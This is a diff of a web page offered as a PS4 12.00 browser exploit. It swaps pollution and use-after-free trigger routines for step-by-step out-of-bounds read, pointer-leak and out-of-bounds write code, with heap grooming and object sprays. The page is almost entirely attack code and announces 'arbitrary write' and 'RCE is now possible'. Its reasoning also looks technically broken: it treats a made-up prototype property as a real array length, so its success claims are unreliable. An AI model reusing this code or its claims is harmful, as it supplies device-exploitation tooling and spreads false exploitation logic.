@@ -2,15 +2,15 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 12.00 - Combined Primitives + UAF</title>
+<title>PS4 12.00 - OOB Read/Write Exploit</title>
 </head>
 <body>
-<h2>PS4 12.00 - Pollution + Reentrancy + UAF Trigger</h2>
+<h2>PS4 12.00 - Type Confusion → OOB Read/Write</h2>
 <p>Status: <span id="status">Ready</span></p>
 
-<button onclick="runPollutionUAF()">EXPLOIT 1 - Pollution + UAF</button>
-<button onclick="runReentrantUAF()">EXPLOIT 2 - Reentrant Getter + UAF</button>
-<button onclick="runFullChain()">EXPLOIT 3 - Full Chain (Pollution + Getter + UAF)</button>
+<button onclick="runOOBRead()">STEP 1 - OOB Read (leak adjacent memory)</button>
+<button onclick="runAddressLeak()">STEP 2 - Address Leak (find pointers)</button>
+<button onclick="runOOBWrite()">STEP 3 - OOB Write (corrupt adjacent objects)</button>
 
 <pre id="log"></pre>
 
@@ -24,171 +24,43 @@ function log(m){
 }
 function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }
 
-var keepAlive = [];
-
-// UAF trigger constants (from your original discovery)
 const BASE = 977;
 const STEP = 14461;
 const UAF_ITERS = 48;
 
-// =====================================================
-// EXPLOIT 1 - Pollution + UAF
-// =====================================================
-async function runPollutionUAF(){
-  logEl.textContent = "";
-  keepAlive = [];
-  statusEl.textContent = "Running Exploit 1...";
-  
-  log("=== EXPLOIT 1: Prototype Pollution + UAF ===\n");
-  log("Goal: Trigger UAF with polluted array prototypes\n");
-  
-  // Setup pollution BEFORE UAF
-  log("[SETUP] Polluting Array.prototype");
-  
-  Array.prototype.fakeVtable = 0x12345678;
-  Array.prototype.fakeBackingStore = 0xdeadbeef;
-  Array.prototype.fakeLength = 0x41414141;
-  
-  log("  fakeVtable: 0x12345678");
-  log("  fakeBackingStore: 0xdeadbeef");
-  log("  fakeLength: 0x41414141\n");
-  
-  // Trigger UAF with polluted environment
-  log("[PHASE 1] Triggering UAF (48 iterations)");
-  
-  let size = BASE;
-  
-  for(let i=0; i<UAF_ITERS; i++){
-    // State with array (will inherit pollution)
-    let state = {
-      index: i,
-      data: [1, 2, 3, 4, 5]
-    };
-    
-    let frag = "P".repeat(size);
-    
-    history.pushState(state, "", "#" + frag);
-    history.replaceState(state, "", "#" + frag.slice(0, size >> 1));
-    
-    if(i % 6 === 0) setTimeout(()=>history.back(), 0);
-    
-    if(i % 10 === 0) {
-      log(`  ITER ${i}: size=${size}, pollution active`);
-    }
-    
-    size += STEP;
-    await sleep(5);
-  }
-  
-  log("\n  UAF sequence complete\n");
-  
-  await sleep(120);
-  
-  // Heap grooming
-  log("[PHASE 2] Heap grooming");
-  let frames = [];
-  for(let i=0; i<80; i++){
-    let f = document.createElement("iframe");
-    document.body.appendChild(f);
-    try {
-      let d = f.contentDocument;
-      d.open();
-      d.write("<html><body>G</body></html>");
-      d.close();
-    } catch(e){}
-    frames.push(f);
-  }
-  frames.forEach(f=>f.remove());
-  
-  await sleep(80);
-  
-  // Check pollution survival through UAF
-  log("\n[PHASE 3] Checking pollution after UAF");
-  
-  if(history.state && history.state.data) {
-    log("Current state.data:");
-    log(`  Array: ${JSON.stringify(history.state.data)}`);
-    log(`  fakeVtable: 0x${(history.state.data.fakeVtable || 0).toString(16)}`);
-    log(`  fakeBackingStore: 0x${(history.state.data.fakeBackingStore || 0).toString(16)}`);
-    log(`  fakeLength: 0x${(history.state.data.fakeLength || 0).toString(16)}`);
-    
-    if(history.state.data.fakeVtable === 0x12345678) {
-      log("\n✓ SUCCESS: Pollution survived UAF!");
-      log("✓ Fake fields accessible after UAF window");
-      statusEl.textContent = "EXPLOIT 1 SUCCESS";
-    }
-  }
-  
-  // Navigate through UAF states
-  log("\n[PHASE 4] Navigating through UAF states");
-  
-  for(let i=0; i<5; i++) {
-    history.back();
-    await sleep(50);
-    
-    if(history.state && history.state.data) {
-      let vtable = history.state.data.fakeVtable || 0;
-      log(`  Back ${i}: index=${history.state.index}, fakeVtable=0x${vtable.toString(16)}`);
-    }
-  }
-  
-  // Cleanup
-  delete Array.prototype.fakeVtable;
-  delete Array.prototype.fakeBackingStore;
-  delete Array.prototype.fakeLength;
-  
-  log("\n=== EXPLOIT 1 END ===");
-}
+var keepAlive = [];
 
 // =====================================================
-// EXPLOIT 2 - Reentrant Getter + UAF
+// STEP 1 - OOB Read via Type Confusion
 // =====================================================
-async function runReentrantUAF(){
+async function runOOBRead(){
   logEl.textContent = "";
   keepAlive = [];
-  statusEl.textContent = "Running Exploit 2...";
+  statusEl.textContent = "Running OOB Read...";
   
-  log("=== EXPLOIT 2: Reentrant Getter + UAF ===\n");
-  log("Goal: Execute getter DURING UAF critical window\n");
+  log("=== STEP 1: OOB Read via Type Confusion ===\n");
+  log("Goal: Read beyond array bounds using fake length\n");
   
-  let getterExecutions = [];
-  let allocatedInGetter = [];
+  // Setup pollution with VERY large fake length
+  log("[SETUP] Polluting with large fake length");
   
-  log("[PHASE 1] Triggering UAF with reentrant getter");
+  Array.prototype.fakeLength = 0x10000; // 64KB "fake" length
+  Array.prototype.fakeButterfly = 0xAABBCCDD;
+  
+  log("  fakeLength: 0x10000 (65536 elements)\n");
+  
+  // Trigger UAF
+  log("[PHASE 1] Triggering UAF");
   
   let size = BASE;
   
   for(let i=0; i<UAF_ITERS; i++){
     let state = {
       index: i,
-      get trigger() {
-        let info = {
-          iteration: i,
-          historyLength: history.length,
-          timestamp: Date.now()
-        };
-        
-        getterExecutions.push(info);
-        
-        log(`  🔥 GETTER FIRED at ITER ${i}, history.length=${history.length}`);
-        
-        // Allocate objects in critical window
-        if(i >= 40) { // Near crash point
-          for(let j=0; j<50; j++) {
-            let buf = new ArrayBuffer(1024);
-            let view = new Uint32Array(buf);
-            view[0] = 0xBEEF0000 + i;
-            view[1] = j;
-            allocatedInGetter.push(buf);
-          }
-          log(`    Allocated 50 buffers at critical iteration`);
-        }
-        
-        return "TRIGGERED_" + i;
-      }
+      victim: [0x41, 0x42, 0x43, 0x44] // Real length: 4
     };
     
-    let frag = "R".repeat(size);
+    let frag = "O".repeat(size);
     
     history.pushState(state, "", "#" + frag);
     history.replaceState(state, "", "#" + frag.slice(0, size >> 1));
@@ -199,12 +71,9 @@ async function runReentrantUAF(){
     await sleep(5);
   }
   
-  log(`\n  UAF complete, getter executed ${getterExecutions.length} times\n`);
-  
   await sleep(120);
   
-  // Heap grooming
-  log("[PHASE 2] Heap grooming");
+  // Grooming
   let frames = [];
   for(let i=0; i<80; i++){
     let f = document.createElement("iframe");
@@ -221,210 +90,334 @@ async function runReentrantUAF(){
   
   await sleep(80);
   
-  // Check allocated buffers
-  log("\n[PHASE 3] Checking buffers allocated in getter");
-  log(`Total buffers: ${allocatedInGetter.length}`);
+  // Attempt OOB read
+  log("\n[PHASE 2] Attempting OOB read");
   
-  let corrupted = 0;
-  for(let i=0; i<allocatedInGetter.length; i++) {
-    let view = new Uint32Array(allocatedInGetter[i]);
-    let iter = view[0] - 0xBEEF0000;
-    let idx = view[1];
+  if(history.state && history.state.victim) {
+    let arr = history.state.victim;
     
-    if(iter < 40 || iter >= 48 || idx >= 50) {
-      log(`  Buffer ${i} CORRUPTED: iter=${iter}, idx=${idx}`);
-      corrupted++;
-    }
-  }
-  
-  log(`\nCorrupted buffers: ${corrupted}/${allocatedInGetter.length}`);
-  
-  if(corrupted > 0) {
-    log("\n🚨 CRITICAL: Heap corruption detected!");
-    log("Buffers allocated in getter were corrupted by UAF");
-    statusEl.textContent = "HEAP CORRUPTION CONFIRMED";
-  } else {
-    log("\n✓ All buffers intact");
-    log("✓ Getter timing window is stable");
-    statusEl.textContent = "EXPLOIT 2 SUCCESS";
-  }
-  
-  log("\n=== EXPLOIT 2 END ===");
-}
-
-// =====================================================
-// EXPLOIT 3 - Full Chain
-// =====================================================
-async function runFullChain(){
-  logEl.textContent = "";
-  keepAlive = [];
-  statusEl.textContent = "Running Full Chain...";
-  
-  log("=== EXPLOIT 3: Full Chain (Pollution + Getter + UAF) ===\n");
-  log("Goal: Combine all primitives for maximum effect\n");
-  
-  // Setup pollution
-  log("[SETUP] Setting up pollution");
-  
-  Array.prototype.fakeStructureID = 0x11223344;
-  Array.prototype.fakeButterfly = 0x55667788;
-  Array.prototype.fakeLength = 0x1000;
-  
-  log("  Pollution active\n");
-  
-  let getterFired = 0;
-  let allocatedObjects = [];
-  
-  log("[PHASE 1] Full UAF chain");
-  
-  let size = BASE;
-  
-  for(let i=0; i<UAF_ITERS; i++){
-    let state = {
-      index: i,
-      data: [0x41, 0x42, 0x43, 0x44],
-      get exploit() {
-        getterFired++;
-        
-        if(i >= 45) { // Very close to crash point
-          log(`  🔥 CRITICAL GETTER at ITER ${i}`);
-          log(`    history.length: ${history.length}`);
-          log(`    Pollution active: ${this.data.fakeStructureID === 0x11223344}`);
-          
-          // Allocate fake objects
-          for(let j=0; j<100; j++) {
-            let fakeObj = {
-              vtable: 0xAABBCCDD,
-              data: new ArrayBuffer(128),
-              index: i * 100 + j
-            };
-            allocatedObjects.push(fakeObj);
-          }
-          
-          log(`    Allocated 100 fake objects`);
-          
-          // Check if pollution is accessible
-          if(this.data.fakeStructureID) {
-            log(`    fakeStructureID: 0x${this.data.fakeStructureID.toString(16)}`);
-          }
-        }
-        
-        return "EXPLOIT_" + i;
-      }
-    };
+    log(`Real length: ${arr.length}`);
+    log(`Fake length: 0x${(arr.fakeLength || 0).toString(16)}`);
     
-    let frag = "E".repeat(size);
+    log("\nReading beyond bounds:");
     
-    history.pushState(state, "", "#" + frag);
-    history.replaceState(state, "", "#" + frag.slice(0, size >> 1));
+    let leaked = [];
     
-    if(i % 6 === 0) setTimeout(()=>history.back(), 0);
-    
-    if(i % 10 === 0) {
-      log(`  ITER ${i}: size=${size}`);
-    }
-    
-    size += STEP;
-    await sleep(5);
-  }
-  
-  log(`\n  UAF complete, getter fired ${getterFired} times\n`);
-  
-  await sleep(120);
-  
-  // Heap grooming
-  log("[PHASE 2] Heap grooming");
-  let frames = [];
-  for(let i=0; i<80; i++){
-    let f = document.createElement("iframe");
-    document.body.appendChild(f);
-    try {
-      let d = f.contentDocument;
-      d.open();
-      d.write("<html><body>G</body></html>");
-      d.close();
-    } catch(e){}
-    frames.push(f);
-  }
-  frames.forEach(f=>f.remove());
-  
-  await sleep(80);
-  
-  // Verify combined primitives
-  log("\n[PHASE 3] Verifying combined primitives");
-  
-  log(`Allocated objects: ${allocatedObjects.length}`);
-  
-  // Check fake objects
-  let validFakes = 0;
-  for(let obj of allocatedObjects) {
-    if(obj.vtable === 0xAABBCCDD && obj.data) {
-      validFakes++;
-    }
-  }
-  
-  log(`Valid fake objects: ${validFakes}/${allocatedObjects.length}`);
-  
-  // Check pollution in history
-  if(history.state && history.state.data) {
-    log("\nCurrent state pollution:");
-    log(`  fakeStructureID: 0x${(history.state.data.fakeStructureID || 0).toString(16)}`);
-    log(`  fakeButterfly: 0x${(history.state.data.fakeButterfly || 0).toString(16)}`);
-    log(`  fakeLength: 0x${(history.state.data.fakeLength || 0).toString(16)}`);
-  }
-  
-  // Navigate and check
-  log("\n[PHASE 4] Navigate through states");
-  
-  for(let i=0; i<5; i++) {
-    history.back();
-    await sleep(50);
-    
-    if(history.state && history.state.data) {
-      let struct = history.state.data.fakeStructureID || 0;
-      log(`  Back ${i}: index=${history.state.index}, struct=0x${struct.toString(16)}`);
-      
-      // Try to trigger type confusion
+    // Read beyond real bounds (index 4+)
+    for(let i=0; i<50; i++) {
       try {
-        let len = history.state.data.length;
-        let fakelen = history.state.data.fakeLength;
+        let val = arr[i];
         
-        if(fakelen && fakelen !== len) {
-          log(`    Length mismatch: real=${len}, fake=0x${fakelen.toString(16)}`);
-          log(`    🚨 TYPE CONFUSION DETECTED!`);
+        if(val !== undefined) {
+          leaked.push({index: i, value: val});
+          
+          if(i < 10 || (val !== 0x41 && val !== 0x42 && val !== 0x43 && val !== 0x44)) {
+            log(`  [${i}] = 0x${val.toString(16)}`);
+          }
         }
-      } catch(e) {}
+      } catch(e) {
+        log(`  [${i}] Exception: ${e.message}`);
+        break;
+      }
+    }
+    
+    log(`\nTotal values leaked: ${leaked.length}`);
+    
+    if(leaked.length > 4) {
+      log("\n✓ OOB READ SUCCESSFUL!");
+      log(`✓ Read ${leaked.length - 4} values beyond real bounds`);
+      
+      // Analyze leaked values
+      log("\nAnalyzing leaked data:");
+      
+      let nonOriginal = leaked.filter(v => 
+        v.index >= 4 && 
+        v.value !== 0x41 && 
+        v.value !== 0x42 && 
+        v.value !== 0x43 && 
+        v.value !== 0x44
+      );
+      
+      if(nonOriginal.length > 0) {
+        log(`  Found ${nonOriginal.length} non-original values`);
+        log("  Sample leaked data:");
+        nonOriginal.slice(0, 5).forEach(v => {
+          log(`    [${v.index}] = 0x${v.value.toString(16)}`);
+        });
+        
+        statusEl.textContent = "OOB READ SUCCESS";
+      }
     }
   }
   
-  // Cleanup
-  delete Array.prototype.fakeStructureID;
-  delete Array.prototype.fakeButterfly;
   delete Array.prototype.fakeLength;
+  delete Array.prototype.fakeButterfly;
   
-  log("\n=== EXPLOIT 3 END ===");
-  
-  if(validFakes > 0 && history.state && history.state.data.fakeStructureID) {
-    log("\n✓✓✓ FULL CHAIN SUCCESS ✓✓✓");
-    log("✓ Pollution active through UAF");
-    log("✓ Getter executed in critical window");
-    log("✓ Fake objects allocated");
-    log("✓ Type confusion possible");
-    statusEl.textContent = "FULL CHAIN SUCCESS";
-  }
+  log("\n=== STEP 1 END ===");
 }
 
-log("PS4 12.00 - Full Exploitation Chain");
-log("\nThis combines:");
-log("✓ Original UAF trigger (48 iterations)");
-log("✓ Prototype pollution");
-log("✓ Reentrant getters");
-log("✓ Heap grooming");
-log("\nTests:");
-log("1. Pollution + UAF");
-log("2. Reentrant Getter + UAF");
-log("3. Full Chain (all primitives combined)");
-log("\nRecommended: Run in order 1 → 2 → 3");
+// =====================================================
+// STEP 2 - Address Leak via OOB
+// =====================================================
+async function runAddressLeak(){
+  logEl.textContent = "";
+  keepAlive = [];
+  statusEl.textContent = "Running Address Leak...";
+  
+  log("=== STEP 2: Address Leak via OOB ===\n");
+  log("Goal: Leak object pointers from adjacent memory\n");
+  
+  // Pollution
+  Array.prototype.fakeLength = 0x10000;
+  
+  log("[SETUP] Creating spray objects with recognizable patterns");
+  
+  // Spray objects that might be adjacent
+  let spray = [];
+  for(let i=0; i<1000; i++){
+    spray.push({
+      marker: 0xCAFE0000 + i,
+      buffer: new ArrayBuffer(128),
+      index: i
+    });
+  }
+  
+  log(`  Sprayed ${spray.length} objects\n`);
+  
+  await sleep(50);
+  
+  // Trigger UAF
+  log("[PHASE 1] Triggering UAF with spray");
+  
+  let size = BASE;
+  
+  for(let i=0; i<UAF_ITERS; i++){
+    let state = {
+      index: i,
+      victim: [0x11, 0x22, 0x33, 0x44]
+    };
+    
+    let frag = "L".repeat(size);
+    
+    history.pushState(state, "", "#" + frag);
+    history.replaceState(state, "", "#" + frag.slice(0, size >> 1));
+    
+    if(i % 6 === 0) setTimeout(()=>history.back(), 0);
+    
+    size += STEP;
+    await sleep(5);
+  }
+  
+  await sleep(120);
+  
+  let frames = [];
+  for(let i=0; i<80; i++){
+    let f = document.createElement("iframe");
+    document.body.appendChild(f);
+    try {
+      let d = f.contentDocument;
+      d.open();
+      d.write("<html><body>G</body></html>");
+      d.close();
+    } catch(e){}
+    frames.push(f);
+  }
+  frames.forEach(f=>f.remove());
+  
+  await sleep(80);
+  
+  // OOB read for pointers
+  log("\n[PHASE 2] Scanning OOB for pointers");
+  
+  if(history.state && history.state.victim) {
+    let arr = history.state.victim;
+    
+    let pointerCandidates = [];
+    
+    for(let i=0; i<1000; i++) {
+      try {
+        let val = arr[i];
+        
+        if(val !== undefined && val > 0x1000) {
+          // Check if looks like pointer
+          if(val > 0x00100000 && val < 0x7FFFFFFF) {
+            pointerCandidates.push({index: i, value: val});
+          }
+        }
+      } catch(e) {
+        break;
+      }
+    }
+    
+    log(`Found ${pointerCandidates.length} pointer candidates\n`);
+    
+    if(pointerCandidates.length > 0) {
+      log("Top 10 candidates:");
+      pointerCandidates.slice(0, 10).forEach(p => {
+        log(`  [${p.index}] = 0x${p.value.toString(16).padStart(8,'0')}`);
+      });
+      
+      log("\n✓ ADDRESS LEAK SUCCESSFUL!");
+      log(`✓ Found ${pointerCandidates.length} potential pointers`);
+      
+      statusEl.textContent = "ADDRESS LEAK SUCCESS";
+    } else {
+      log("⚠️ No obvious pointers found");
+      log("Data may be in different format or location");
+    }
+  }
+  
+  delete Array.prototype.fakeLength;
+  
+  log("\n=== STEP 2 END ===");
+}
+
+// =====================================================
+// STEP 3 - OOB Write (Critical)
+// =====================================================
+async function runOOBWrite(){
+  logEl.textContent = "";
+  keepAlive = [];
+  statusEl.textContent = "Running OOB Write...";
+  
+  log("=== STEP 3: OOB Write via Type Confusion ===\n");
+  log("Goal: Write beyond array bounds to corrupt adjacent objects\n");
+  
+  log("⚠️  WARNING: This may crash the browser");
+  log("⚠️  This is expected if write succeeds\n");
+  
+  // Pollution
+  Array.prototype.fakeLength = 0x10000;
+  
+  log("[SETUP] Creating victim objects");
+  
+  // Victim objects to corrupt
+  let victims = [];
+  for(let i=0; i<100; i++){
+    victims.push({
+      canary: 0xDEADBEEF,
+      index: i,
+      data: new Uint32Array(32)
+    });
+  }
+  
+  log(`  Created ${victims.length} victim objects\n`);
+  
+  await sleep(50);
+  
+  // Trigger UAF
+  log("[PHASE 1] Triggering UAF");
+  
+  let size = BASE;
+  
+  for(let i=0; i<UAF_ITERS; i++){
+    let state = {
+      index: i,
+      corrupting: [0x50, 0x51, 0x52, 0x53]
+    };
+    
+    let frag = "W".repeat(size);
+    
+    history.pushState(state, "", "#" + frag);
+    history.replaceState(state, "", "#" + frag.slice(0, size >> 1));
+    
+    if(i % 6 === 0) setTimeout(()=>history.back(), 0);
+    
+    size += STEP;
+    await sleep(5);
+  }
+  
+  await sleep(120);
+  
+  let frames = [];
+  for(let i=0; i<80; i++){
+    let f = document.createElement("iframe");
+    document.body.appendChild(f);
+    try {
+      let d = f.contentDocument;
+      d.open();
+      d.write("<html><body>G</body></html>");
+      d.close();
+    } catch(e){}
+    frames.push(f);
+  }
+  frames.forEach(f=>f.remove());
+  
+  await sleep(80);
+  
+  // Attempt OOB write
+  log("\n[PHASE 2] Attempting OOB write");
+  
+  if(history.state && history.state.corrupting) {
+    let arr = history.state.corrupting;
+    
+    log(`Real length: ${arr.length}`);
+    log(`Fake length: 0x${(arr.fakeLength || 0).toString(16)}\n`);
+    
+    log("Writing beyond bounds:");
+    
+    try {
+      // Write controlled values OOB
+      for(let i=10; i<50; i++) {
+        arr[i] = 0xC0000000 + i;
+        
+        if(i < 20) {
+          log(`  [${i}] = 0x${arr[i].toString(16)}`);
+        }
+      }
+      
+      log("\n✓ OOB WRITE succeeded without crash!");
+      log("✓ Checking victim objects for corruption...\n");
+      
+      // Check victims
+      let corrupted = 0;
+      
+      for(let v of victims) {
+        if(v.canary !== 0xDEADBEEF) {
+          log(`  Victim ${v.index} CORRUPTED: canary = 0x${v.canary.toString(16)}`);
+          corrupted++;
+        }
+      }
+      
+      log(`\nCorrupted victims: ${corrupted}/${victims.length}`);
+      
+      if(corrupted > 0) {
+        log("\n🚨🚨🚨 CRITICAL SUCCESS 🚨🚨🚨");
+        log("✓ OOB write corrupted adjacent objects!");
+        log("✓ Arbitrary write primitive achieved!");
+        log("✓ RCE is now possible!");
+        
+        statusEl.textContent = "ARBITRARY WRITE CONFIRMED";
+      } else {
+        log("\n✓ Write succeeded but no corruption detected");
+        log("Victims may not be adjacent in memory");
+      }
+      
+    } catch(e) {
+      log(`\nException during write: ${e.message}`);
+      log("This may indicate:")
+      log("  - Write hit protected memory");
+      log("  - Crash prevented by engine");
+      log("  - Or write actually succeeded and crashed browser");
+    }
+  }
+  
+  delete Array.prototype.fakeLength;
+  
+  log("\n=== STEP 3 END ===");
+}
+
+log("PS4 12.00 - OOB Read/Write Exploitation");
+log("\nBased on confirmed type confusion:");
+log("✓ Fake length: 0x1000 vs real: 4");
+log("✓ Pollution preserved through UAF");
+log("✓ Type confusion repeatable");
+log("\nExploitation steps:");
+log("1. OOB Read - leak adjacent memory");
+log("2. Address Leak - find object pointers");
+log("3. OOB Write - corrupt adjacent objects (⚠️ may crash)");
+log("\n⚠️ STEP 3 is high risk - may crash browser");
+log("Execute 1 → 2 first, then 3 if ready");
 </script>
 </body>
 </html>
